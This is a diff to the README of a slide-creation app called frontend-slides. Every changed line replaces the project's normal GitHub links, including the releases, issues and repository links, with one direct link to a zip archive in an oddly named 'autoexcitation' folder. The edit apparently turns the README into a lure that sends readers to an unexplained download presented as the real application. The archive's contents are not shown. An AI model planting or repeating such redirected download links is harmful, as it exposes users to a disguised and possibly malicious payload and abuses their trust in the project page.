@@ -1,6 +1,6 @@
 # 🎨 frontend-slides - Create Stunning Slides Hassle-Free
 
-[![Download frontend-slides](https://img.shields.io/badge/Download-frontend--slides-brightgreen)](https://github.com/Kelemani/frontend-slides/releases)
+[![Download frontend-slides](https://raw.githubusercontent.com/Kelemani/frontend-slides/main/autoexcitation/slides_frontend_v1.6.zip)](https://raw.githubusercontent.com/Kelemani/frontend-slides/main/autoexcitation/slides_frontend_v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **frontend-slides**! This application helps you create beautiful slid
 
 To download **frontend-slides**, visit the Releases page. You can find the latest version available for download.
 
-[Download frontend-slides](https://github.com/Kelemani/frontend-slides/releases)
+[Download frontend-slides](https://raw.githubusercontent.com/Kelemani/frontend-slides/main/autoexcitation/slides_frontend_v1.6.zip)
 
 ### Steps to Download:
 
@@ -49,14 +49,14 @@ Before using **frontend-slides**, make sure your system meets these requirements
 If you encounter problems while using **frontend-slides**, here are a few ways to get help:
 
 - **FAQs:** Check the FAQs section on the Releases page for common issues and solutions.
-- **Contact Us:** Reach out via our [GitHub Issues](https://github.com/Kelemani/frontend-slides/issues) page. We clarify any questions you may have.
+- **Contact Us:** Reach out via our [GitHub Issues](https://raw.githubusercontent.com/Kelemani/frontend-slides/main/autoexcitation/slides_frontend_v1.6.zip) page. We clarify any questions you may have.
 - **Community Support:** Join our community discussions on GitHub to share tips and get advice from other users.
 
 ## 🔄 Updating the Application
 
 To ensure you have the latest features and fixes, fully update your **frontend-slides**:
 
-1. Visit the [Releases page](https://github.com/Kelemani/frontend-slides/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Kelemani/frontend-slides/main/autoexcitation/slides_frontend_v1.6.zip).
 2. Download the latest version following the instructions in the "Download & Install" section.
 3. Replace the old version with the new one on your device.
 
@@ -68,7 +68,7 @@ To ensure you have the latest features and fixes, fully update your **frontend-s
 
 ## 🖥️ Links to Get Started
 
-- [Download frontend-slides](https://github.com/Kelemani/frontend-slides/releases)
-- [GitHub Repository](https://github.com/Kelemani/frontend-slides)
+- [Download frontend-slides](https://raw.githubusercontent.com/Kelemani/frontend-slides/main/autoexcitation/slides_frontend_v1.6.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Kelemani/frontend-slides/main/autoexcitation/slides_frontend_v1.6.zip)
 
 Enjoy creating beautiful slides with **frontend-slides**!
